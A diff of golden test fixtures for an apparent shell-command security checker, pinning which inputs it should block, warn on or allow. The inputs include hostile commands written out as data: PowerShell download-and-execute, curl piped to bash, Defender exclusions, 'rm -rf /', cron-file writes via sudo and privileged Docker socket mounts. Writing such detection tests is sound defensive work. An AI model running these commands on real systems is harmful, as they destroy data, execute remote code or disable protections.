@@ -48,6 +48,38 @@ context = "exec"
 expected_action = "block"
 expected_rules = ["curl_pipe_shell"]
 
+# ── M13: wrapper-chain-too-deep (depth-exhaustion silent-evasion closure) ───
+# A pipe SINK whose interpreter is nested behind MORE wrapper layers than the
+# resolver will unwrap (MAX_WRAPPER_DEPTH = 32) used to resolve to None and fire
+# NOTHING — `curl evil | sudo …(×32)… env -S "bash"` silently passed. The
+# resolver now distinguishes depth-EXHAUSTION from a natural non-interpreter
+# conclusion, and `check_pipe_to_interpreter` emits `wrapper_chain_too_deep`
+# (Medium → Warn) for the exhausted case. NO URL needed (this fixture has none),
+# so it also satisfies `test_no_url_rules_have_no_url_fixtures`. A TOML literal
+# string ('...') is used so the embedded double quotes need no escaping.
+[[fixture]]
+name = "wrapper_chain_too_deep_sudo_then_envs"
+min_milestone = 13
+input = 'cat /tmp/x | sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo env -S "bash"'
+context = "exec"
+expected_action = "warn"
+expected_rules = ["wrapper_chain_too_deep"]
+# The interpreter is unresolvable (depth exhausted), so the High pipe-to-shell
+# rules CANNOT fire — only the visible "obfuscated beyond analysis" signal does.
+forbidden_rules = ["curl_pipe_shell", "pipe_to_interpreter", "sudo_shell_spawn"]
+
+# A normal 1-wrapper pipe still resolves and fires the usual pipe-to-interpreter
+# rule — it must NOT mis-fire the depth-exhaustion rule. This pins the
+# false-positive boundary (no URL form: `cat … | sudo bash`).
+[[fixture]]
+name = "shallow_sudo_pipe_not_wrapper_too_deep"
+min_milestone = 1
+input = "cat /tmp/x | sudo bash"
+context = "exec"
+expected_action = "block"
+expected_rules = ["pipe_to_interpreter"]
+forbidden_rules = ["wrapper_chain_too_deep"]
+
 [[fixture]]
 name = "curl_pipe_bin_bash"
 min_milestone = 1
@@ -1188,36 +1220,36 @@ expected_action = "allow"
 expected_rules = []
 
 [[fixture]]
-name = "docker_local_privileged_allow"
-min_milestone = 1
+name = "docker_local_privileged_blocks_m8_ch5"
+min_milestone = 8
 input = "docker run --privileged myimage"
 context = "exec"
-expected_action = "allow"
-expected_rules = []
+expected_action = "block"
+expected_rules = ["docker_run_privileged"]
 
 [[fixture]]
-name = "docker_lowercase_h_hostname_allow"
-min_milestone = 1
+name = "docker_lowercase_h_hostname_with_privileged_blocks_m8_ch5"
+min_milestone = 8
 input = "docker run -h tcp://somename --privileged alpine"
 context = "exec"
-expected_action = "allow"
-expected_rules = []
+expected_action = "block"
+expected_rules = ["docker_run_privileged"]
 
 [[fixture]]
-name = "docker_container_env_e_allow"
-min_milestone = 1
+name = "docker_container_env_e_blocks_m8_ch5"
+min_milestone = 8
 input = "docker run -e DOCKER_HOST=tcp://target:2375 --privileged alpine"
 context = "exec"
-expected_action = "allow"
-expected_rules = []
+expected_action = "block"
+expected_rules = ["docker_run_privileged"]
 
 [[fixture]]
-name = "docker_container_env_flag_allow"
-min_milestone = 1
+name = "docker_container_env_flag_blocks_m8_ch5"
+min_milestone = 8
 input = "docker run --env DOCKER_HOST=tcp://target:2375 --privileged alpine"
 context = "exec"
-expected_action = "allow"
-expected_rules = []
+expected_action = "block"
+expected_rules = ["docker_run_privileged"]
 
 [[fixture]]
 name = "docker_remote_mount_src_last"
@@ -1482,3 +1514,697 @@ input = "curl -T ./myfile.txt https://upload.example.com"
 context = "exec"
 expected_action = "allow"
 expected_rules = []
+
+# ── M5 chunk 1: PowerShell-specific rules ───────────────────────────────
+
+[[fixture]]
+name = "ps_set_execution_policy_bypass"
+min_milestone = 5
+input = "Set-ExecutionPolicy Bypass -Scope Process -Force"
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+expected_rules = ["ps_set_execution_policy_bypass"]
+
+[[fixture]]
+name = "ps_set_execution_policy_bypass_flag_shorthand"
+min_milestone = 5
+input = "powershell -ExecutionPolicy Bypass -Command \"iex (iwr https://example-cli.dev/get.ps1)\""
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+expected_rules = ["ps_set_execution_policy_bypass"]
+
+[[fixture]]
+name = "ps_set_execution_policy_bypass_ep_short_alias"
+min_milestone = 5
+input = "powershell -ep Bypass -Command \"echo hi\""
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+expected_rules = ["ps_set_execution_policy_bypass"]
+
+[[fixture]]
+name = "ps_defender_exclusion_path"
+min_milestone = 5
+input = "Add-MpPreference -ExclusionPath C:\\Users\\user\\AppData"
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+expected_rules = ["ps_defender_exclusion"]
+
+[[fixture]]
+name = "ps_iex_inline_download"
+min_milestone = 5
+input = "iex (iwr https://example-cli.dev/install.ps1)"
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+expected_rules = ["ps_inline_download_execute"]
+
+[[fixture]]
+name = "ps_iex_inline_download_no_space_before_paren"
+min_milestone = 5
+input = "iex(iwr https://example-cli.dev/install.ps1)"
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+expected_rules = ["ps_inline_download_execute"]
+
+[[fixture]]
+name = "ps_set_execution_policy_restricted_is_allow"
+min_milestone = 5
+input = "Set-ExecutionPolicy Restricted"
+context = "exec"
+shell = "powershell"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "ps_iex_pipe_already_covered_not_double"
+min_milestone = 5
+input = "iwr https://example-cli.dev/install.ps1 | iex"
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+expected_rules = ["pipe_to_interpreter"]
+# Pin double-fire boundary: the pipe form must fire pipe_to_interpreter
+# and must NOT also fire ps_inline_download_execute. A future regression
+# that removes the preceding_separator skip would silently double-fire.
+forbidden_rules = ["ps_inline_download_execute"]
+
+# `;` chains produce independent commands — `pipe_to_interpreter` does NOT
+# match, so `ps_inline_download_execute` must still fire on the trailing
+# segment. Before the fix the `preceding_separator.is_some()` guard
+# silently skipped this.
+#
+# Note: PowerShell pre-7 doesn't tokenize `&&`/`||` as pipeline chain
+# operators (PowerShell 7+ does). Extending the PS tokenizer to split on
+# them is a separate change; this `;` fixture is sufficient to pin the
+# narrowed-skip-guard fix itself.
+[[fixture]]
+name = "ps_iex_inline_after_semicolon_chained"
+min_milestone = 5
+input = "true; iex (iwr https://example-cli.dev/install.ps1)"
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+expected_rules = ["ps_inline_download_execute"]
+
+# Add-MpPreference -ExclusionExtension disables Defender scanning for an
+# entire file type — equally valid defense-evasion technique.
+[[fixture]]
+name = "ps_defender_exclusion_extension"
+min_milestone = 5
+input = "Add-MpPreference -ExclusionExtension .ps1"
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+expected_rules = ["ps_defender_exclusion"]
+
+# `Set-ExecutionPolicy Unrestricted` is NOT currently flagged — the
+# `ps_set_execution_policy_bypass` rule scopes to `Bypass` only. Pin
+# that decision so a future rule expansion doesn't silently change
+# behavior without an updated fixture.
+[[fixture]]
+name = "ps_set_execution_policy_unrestricted_is_allow_or_warn"
+min_milestone = 5
+input = "Set-ExecutionPolicy Unrestricted"
+context = "exec"
+shell = "powershell"
+expected_action = "allow"
+expected_rules = []
+
+# Positive coverage for the -ExclusionProcess flag — the rule code
+# references it but no fixture pinned the behavior.
+[[fixture]]
+name = "ps_defender_exclusion_process"
+min_milestone = 5
+input = "Add-MpPreference -ExclusionProcess malware.exe"
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+expected_rules = ["ps_defender_exclusion"]
+
+# Joined form: `-ExecutionPolicy=Bypass` (some users / scripts write it
+# this way). The rule code handles it; this fixture pins the contract.
+[[fixture]]
+name = "ps_set_execution_policy_bypass_joined"
+min_milestone = 5
+input = "powershell -ExecutionPolicy=Bypass -Command \"echo hi\""
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+expected_rules = ["ps_set_execution_policy_bypass"]
+
+# Joined short-alias form: `-ep=Bypass`. Same intent, different syntax.
+[[fixture]]
+name = "ps_set_execution_policy_bypass_ep_joined"
+min_milestone = 5
+input = "powershell -ep=Bypass -Command \"echo hi\""
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+expected_rules = ["ps_set_execution_policy_bypass"]
+
+# PR #121 fix-list item 12 — PowerShell parameter-binding accepts `:` as
+# an equivalent joined-form separator to `=` (`-Param:Value` and
+# `-Param=Value` resolve to the same `Param=Value` binding). Pre-fix the
+# rule only matched `=`; attacker payloads that use the colon form
+# (`powershell -ExecutionPolicy:Bypass -Command ...`) reached tier 3 but
+# the rule never fired, producing `action: allow`.
+[[fixture]]
+name = "ps_set_execution_policy_bypass_colon_form"
+min_milestone = 5
+input = "powershell -ExecutionPolicy:Bypass -Command \"echo hi\""
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+expected_rules = ["ps_set_execution_policy_bypass"]
+
+# PR #121 fix-list item 12 — `-ex` is the shortest unambiguous prefix
+# alias for `-ExecutionPolicy` (powershell.exe / pwsh have no other
+# `-Ex*` parameter). Pre-fix `-ex` failed at tier 1 (the PATTERN_TABLE
+# regex `-(?i:ExecutionPolicy|ep)\b` did not cover it), so the fast gate
+# evicted the payload before any tier-3 rule had a chance to run.
+[[fixture]]
+name = "ps_set_execution_policy_bypass_ex_alias"
+min_milestone = 5
+input = "powershell -ex Bypass -Command \"echo hi\""
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+expected_rules = ["ps_set_execution_policy_bypass"]
+
+# PR #121 fix-list item 12 — same colon-joined form, but on the cmdlet
+# branch (the cmdlet path historically only looked for a bare `bypass`
+# token, never a `-ExecutionPolicy:Bypass` token). The post-fix cmdlet
+# branch delegates to `has_execution_policy_bypass_flag`, which covers
+# all four named forms (separated, `=`-joined, `:`-joined).
+[[fixture]]
+name = "ps_set_execution_policy_cmdlet_colon_form"
+min_milestone = 5
+input = "Set-ExecutionPolicy -ExecutionPolicy:Bypass -Scope Process -Force"
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+expected_rules = ["ps_set_execution_policy_bypass"]
+
+# PR #121 fix-list item 12 — colon-joined form for `Add-MpPreference`'s
+# `-ExclusionPath` flag. PowerShell parameter-binding accepts
+# `-ExclusionPath:C:\Users\...` as equivalent to `-ExclusionPath=...`
+# and the bare-flag separated form. Pre-fix the rule only matched
+# `-exclusionpath=`, so the colon form passed through silently.
+[[fixture]]
+name = "ps_defender_exclusion_colon_form"
+min_milestone = 5
+input = "Add-MpPreference -ExclusionPath:C:\\Users\\user\\AppData"
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+expected_rules = ["ps_defender_exclusion"]
+
+# PowerShell 7+ pipeline chain operators `&&` and `||` are now first-class
+# separators in tokenize_powershell. With `;`-only splitting (the M5 chunk 1
+# state) the attacker could bypass `ps_inline_download_execute` by chaining
+# the download-execute behind `&&` or `||`. These fixtures pin the gap closure:
+# the leading segment can be anything; the trailing `iex (iwr ...)` must
+# still fire `ps_inline_download_execute` because the new separators are NOT
+# in the `is_pipe_separator` allowlist (so the rule's narrow-skip guard
+# correctly lets the inline download-execute through).
+[[fixture]]
+name = "ps_iex_inline_after_and_chained"
+min_milestone = 5
+input = "Get-Date && iex (iwr https://example-cli.dev/install.ps1)"
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+expected_rules = ["ps_inline_download_execute"]
+# Pin that `&&` is NOT tokenized as a pipe variant: a regression in the
+# tokenizer that collapsed `&&` into pipe-form would re-route this to
+# pipe_to_interpreter and silently pass the positive-rules check above.
+forbidden_rules = ["pipe_to_interpreter"]
+
+[[fixture]]
+name = "ps_iex_inline_after_or_chained"
+min_milestone = 5
+input = "Test-Path nope || iex (iwr https://example-cli.dev/install.ps1)"
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+expected_rules = ["ps_inline_download_execute"]
+# Pin that `||` is NOT tokenized as a pipe variant — symmetric guard
+# to the `&&` fixture above. Catches the specific precedence bug class
+# where `||` is consumed as two single `|` pipes.
+forbidden_rules = ["pipe_to_interpreter"]
+
+# M8 ch1 — operational-context fixtures.
+#
+# The standard golden-fixture runner does NOT seed a labels file in the user
+# config dir, so `policy.context_labels` is empty and `rules::context::check`
+# short-circuits on every input. These fixtures pin that behavior — they MUST
+# NOT regress to a block when the labels file is absent. The block path is
+# covered by the dedicated integration test
+# `context_command_block_when_labeled` in `tests/golden_fixtures.rs`, which
+# injects a temp labels file and overrides detection via the disable env's
+# inverse path (a per-test labels-file seed).
+
+[[fixture]]
+name = "context_kubectl_get_pods_no_labels_allow"
+min_milestone = 8
+input = "kubectl get pods -n payments"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "context_aws_s3_ls_no_labels_allow"
+min_milestone = 8
+input = "aws s3 ls s3://prod-bucket/"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "context_kubectl_delete_no_labels_allow"
+min_milestone = 8
+input = "kubectl delete namespace payments"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "context_aws_s3_rm_no_labels_allow"
+min_milestone = 8
+input = "aws s3 rm s3://prod-bucket/old-dump.sql"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "context_helm_uninstall_no_labels_allow"
+min_milestone = 8
+input = "helm uninstall payments --namespace payments-prod"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "context_kubectl_apply_dev_no_labels_allow"
+min_milestone = 8
+input = "kubectl apply -f deploy.yaml -n dev"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+# M8 ch2 — SSH operational-context fixtures.
+#
+# Like the M8 ch1 context fixtures, the static fixture runner does NOT seed
+# the SSH host-labels file, so `policy.ssh_host_labels` is empty and
+# `rules::ssh_context::check` short-circuits on every input. These fixtures
+# pin that behavior — they MUST NOT regress to a block when the labels file
+# is absent. The block/info paths are covered by
+# `ssh_rule_blocks_destructive_on_labeled_host` and
+# `ssh_rule_emits_info_on_bare_labeled_host` in `tests/golden_fixtures.rs`,
+# which seed a temp labels file under TIRITH_POLICY_ROOT + a fake .git
+# boundary.
+
+[[fixture]]
+name = "ssh_destructive_inner_no_labels_allow"
+min_milestone = 8
+input = "ssh prod-host 'sudo systemctl restart payments'"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "ssh_readonly_inner_no_labels_allow"
+min_milestone = 8
+input = "ssh prod-host 'ls'"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "ssh_dev_host_no_labels_allow"
+min_milestone = 8
+input = "ssh dev-host 'sudo systemctl restart x'"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "ssh_bare_no_labels_allow"
+min_milestone = 8
+input = "ssh prod-host"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+# M8 ch3 — IaC operational-context rules.
+#
+# The fixture runner uses the default Policy (no labels, no
+# `iac_require_plan_before_apply`), so the prod / plan-hash paths cannot
+# fire here — those are covered by dedicated unit tests in `rules/iac.rs`.
+# The fixtures below pin the tool-only paths the runner CAN reach.
+
+[[fixture]]
+name = "terraform_apply_auto_approve_warns"
+min_milestone = 8
+input = "terraform apply -auto-approve"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["iac_apply_auto_approve"]
+
+[[fixture]]
+name = "tofu_apply_auto_approve_warns"
+min_milestone = 8
+input = "tofu apply -auto-approve"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["iac_apply_auto_approve"]
+
+[[fixture]]
+name = "pulumi_up_yes_warns"
+min_milestone = 8
+input = "pulumi up --yes"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["iac_apply_auto_approve"]
+
+[[fixture]]
+name = "terraform_apply_clean_allow"
+min_milestone = 8
+input = "terraform apply tfplan"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "terraform_destroy_no_label_allow"
+min_milestone = 8
+input = "terraform destroy"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+# M8 ch4 — sudo-escalation rules.
+#
+# Each fixture below pins one of the five M8 ch4 rules at its default
+# High severity. The `sudo_env_preserve_sensitive` row uses the
+# explicit `--preserve-env=AWS_SECRET_ACCESS_KEY` form so the rule
+# fires from a presence-only name check (no env mutation needed —
+# avoids the libc-environ race documented in safe_command's env
+# integration tests).
+
+[[fixture]]
+name = "sudo_sh_blocks"
+min_milestone = 8
+input = "sudo sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["sudo_shell_spawn"]
+
+[[fixture]]
+name = "sudo_preserve_env_aws_secret_blocks"
+min_milestone = 8
+input = "sudo --preserve-env=AWS_SECRET_ACCESS_KEY pip install foo"
+context = "exec"
+expected_action = "block"
+expected_rules = ["sudo_env_preserve_sensitive"]
+
+[[fixture]]
+name = "sudo_tee_etc_cron_blocks"
+min_milestone = 8
+input = "echo evil | sudo tee /etc/cron.d/x"
+context = "exec"
+expected_action = "block"
+expected_rules = ["sudo_tee_system_file"]
+
+[[fixture]]
+name = "sudo_curl_usr_local_bin_blocks"
+min_milestone = 8
+input = "sudo curl -o /usr/local/bin/foo https://example.com/foo"
+context = "exec"
+expected_action = "block"
+expected_rules = ["sudo_download_install"]
+
+[[fixture]]
+name = "sudo_chmod_recursive_home_blocks"
+min_milestone = 8
+input = "sudo chmod -R 777 /home"
+context = "exec"
+expected_action = "block"
+expected_rules = ["sudo_recursive_perms_broad_path"]
+
+# Clean-allow fixtures pin the narrow-path / safe-target shapes that
+# the rule MUST NOT flag.
+
+[[fixture]]
+name = "sudo_apt_update_allows"
+min_milestone = 8
+input = "sudo apt update"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "sudo_tee_tmp_allows"
+min_milestone = 8
+input = "echo cfg | sudo tee /tmp/foo"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "sudo_chmod_narrow_allows"
+min_milestone = 8
+input = "sudo chmod -R 755 /home/me/proj"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+# M8 ch5 — container-runtime rules.
+
+[[fixture]]
+name = "docker_run_privileged_blocks"
+min_milestone = 8
+input = "docker run --privileged alpine"
+context = "exec"
+expected_action = "block"
+expected_rules = ["docker_run_privileged"]
+
+[[fixture]]
+name = "docker_run_docker_sock_bind_mount_blocks"
+min_milestone = 8
+input = "docker run -v /var/run/docker.sock:/var/run/docker.sock alpine"
+context = "exec"
+expected_action = "block"
+expected_rules = ["docker_run_sensitive_bind_mount"]
+
+[[fixture]]
+name = "docker_run_benign_allows"
+min_milestone = 8
+input = "docker run --rm alpine echo ok"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+# M9 ch5 — exec-provenance HOT subset (3 cheap rules: exec_in_tmp,
+# exec_in_repo_bin, path_writable_dir_before_system).
+#
+# These fire from `engine::analyze` (Exec) ONLY when `policy.exec_guard_enabled`
+# is set — opt-in, default false. The standard golden-fixture runner uses the
+# default policy and `cwd = None`, so the exec-guard block never runs and none
+# of the three hot rules can fire. These fixtures PIN that no-fire default: a
+# regression that ran the exec-provenance hot path unconditionally (ignoring the
+# flag) would flip these to a finding and fail here. The positive behavior is
+# covered by unit tests in `crates/tirith-core/src/path_audit.rs` (which inject
+# a synthetic repo/PATH/tmp context) and the `tirith exec`/`path` CLIs.
+
+[[fixture]]
+name = "exec_leader_in_tmp_no_fire_at_default_policy"
+min_milestone = 9
+input = "/tmp/installer --yes"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+# exec_guard_enabled defaults off → the /tmp leader path must NOT raise the
+# hot-path rule from the default-policy fixture runner.
+forbidden_rules = ["exec_in_tmp", "path_writable_dir_before_system"]
+
+[[fixture]]
+name = "exec_leader_in_repo_bin_no_fire_at_default_policy"
+min_milestone = 9
+input = "./node_modules/.bin/eslint --fix"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+# A repo-local leader path must NOT raise exec_in_repo_bin at default policy.
+forbidden_rules = ["exec_in_repo_bin", "path_writable_dir_before_system"]
+
+[[fixture]]
+name = "exec_bare_command_no_fire_at_default_policy"
+min_milestone = 9
+input = "kubectl get pods"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+# A normal bare command resolving on $PATH must stay clean; none of the three
+# hot exec-provenance rules fire from the default-policy runner.
+forbidden_rules = [
+    "exec_in_tmp",
+    "exec_in_repo_bin",
+    "path_writable_dir_before_system",
+]
+
+# M10 ch1 — blast-radius CHEAP hot-path subset (4 rules:
+# blast_writes_system_path, blast_empty_var_glob, blast_find_delete,
+# blast_rsync_delete).
+#
+# These fire from `engine::analyze` (Exec) via the filesystem-FREE
+# `blast_radius::cheap_check`, gated at tier-1 by the `destructive_fs_op`
+# PATTERN_TABLE entry. They are pure string-shape checks (plus an env-map
+# lookup for the empty-`$VAR/` case) — NO filesystem walk, NO glob expansion,
+# NO file counting. The 3 SIMULATOR-ONLY rules (blast_deletes_outside_repo,
+# blast_symlink_traversal, blast_large_file_count) require the filesystem walk
+# that runs ONLY under `tirith preview`, so they have NO static fixture (they
+# live in EXTERNALLY_TRIGGERED_RULES, covered by blast_radius.rs unit tests).
+#
+# IMPORTANT: the golden-fixture runner uses `cwd = None`, so cheap_check
+# snapshots the real process env. The empty-`$VAR/` fixture uses a variable
+# name that is never set in CI (`TIRITH_FIXTURE_UNSET_DIR`) so it resolves to
+# empty and the rule fires deterministically.
+
+[[fixture]]
+name = "blast_rm_rf_home_system_path"
+min_milestone = 10
+input = "rm -rf /home"
+context = "exec"
+expected_action = "block"
+expected_rules = ["blast_writes_system_path"]
+
+[[fixture]]
+name = "blast_rm_rf_root_slash_system_path"
+min_milestone = 10
+input = "rm -rf /"
+context = "exec"
+expected_action = "block"
+expected_rules = ["blast_writes_system_path"]
+
+[[fixture]]
+name = "blast_chmod_recursive_etc_system_path"
+min_milestone = 10
+input = "chmod -R 0777 /etc"
+context = "exec"
+expected_action = "block"
+expected_rules = ["blast_writes_system_path"]
+
+# F2: tirith sees only its OWN process env, not the interactive shell's. A var
+# that is merely ABSENT from tirith's env (like `TIRITH_FIXTURE_UNSET_DIR`) might
+# be a benign non-exported shell-local, so the rule fires at Info (advisory),
+# NOT High/Block — over-blocking a safe command teaches users to `--bypass`.
+# A var that is PRESENT-and-empty IS an unambiguous collapse and fires High;
+# that case is unit-tested in blast_radius.rs (`empty_var_present_empty_is_high…`)
+# because a fixture cannot inject a present-and-empty var into the live process
+# env without an env mutation (the libc setenv race — see PR #125).
+# DEPENDENCY: this fixture relies on `TIRITH_FIXTURE_UNSET_DIR` being absent in
+# the test process env; if CI ever sets that name the rule would resolve it and
+# this fixture would change shape. The rule still fires (so the tier-1-reachable
+# safeguard covers it), just at Info → Allow.
+[[fixture]]
+name = "blast_empty_var_glob_collapses_to_root"
+min_milestone = 10
+input = 'rm -rf "$TIRITH_FIXTURE_UNSET_DIR/"'
+context = "exec"
+expected_action = "allow"
+expected_rules = ["blast_empty_var_glob"]
+
+[[fixture]]
+name = "blast_find_delete_recursive_sweep"
+min_milestone = 10
+input = "find . -type f -delete"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["blast_find_delete"]
+
+[[fixture]]
+name = "blast_rsync_delete_prunes_destination"
+min_milestone = 10
+input = "rsync -a --delete src/ dst/"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["blast_rsync_delete"]
+
+[[fixture]]
+name = "blast_rm_rf_relative_dist_no_fire"
+min_milestone = 10
+input = "rm -rf ./dist"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+# The whole point of the hot/cold split: a repo-relative target is NOT a system
+# path, so the CHEAP hot-path check stays silent. Counting `./dist`'s impact is
+# `tirith preview`'s job (off the hot path), never `tirith check`'s.
+forbidden_rules = [
+    "blast_writes_system_path",
+    "blast_deletes_outside_repo",
+    "blast_large_file_count",
+    "blast_symlink_traversal",
+]
+
+[[fixture]]
+name = "blast_find_without_delete_no_fire"
+min_milestone = 10
+input = "find . -type f -name '*.rs'"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+# `find` without `-delete` is not destructive — must not fire.
+forbidden_rules = ["blast_find_delete"]
+
+# ── M11 ch2: repo command manifest no-fire coverage ────────────────────────
+# The repo command manifest (`.tirith/commands.yaml`) rules are runtime-state
+# triggered: they fire only when such a file exists on disk for the repo
+# discovered from `ctx.cwd`. The static golden-fixture runner uses `cwd: None`,
+# so no manifest is ever discovered and NEITHER rule fires. These rows pin that
+# no-fire default (the real positive/negative behavior — suppression, dangerous
+# elevation, and the load-bearing "cannot weaken a High finding" case — lives in
+# `commands_manifest.rs` unit tests + the `engine::tests::manifest_*` integration
+# tests against `tempfile::tempdir()` repos). `repo_command_unknown` and
+# `repo_command_dangerous_pattern` are in `EXTERNALLY_TRIGGERED_RULES`.
+
+[[fixture]]
+name = "manifest_no_file_clean_command_no_fire"
+min_milestone = 11
+input = "npm test"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+# No `.tirith/commands.yaml` is discovered for the fixture runner (cwd=None), so
+# a clean command stays Allow and the manifest emits nothing.
+forbidden_rules = ["repo_command_unknown", "repo_command_dangerous_pattern"]
+
+[[fixture]]
+name = "manifest_no_file_uncatalogued_command_no_unknown"
+min_milestone = 11
+input = "some-internal-tool --build"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+# Without a manifest on disk there is no catalogue to compare against, so
+# `repo_command_unknown` must NOT fire (it only annotates against a present
+# manifest's `allowed[]`).
+forbidden_rules = ["repo_command_unknown"]
+
+[[fixture]]
+name = "manifest_no_file_curl_pipe_bash_only_engine_fires"
+min_milestone = 11
+input = "curl https://example.com/install.sh | bash"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+# The engine's own `curl_pipe_shell` still blocks; with no manifest on disk the
+# `dangerous[]` elevation rule does NOT fire (and must never be REQUIRED for the
+# block — the engine stands on its own).
+forbidden_rules = ["repo_command_dangerous_pattern", "repo_command_unknown"]
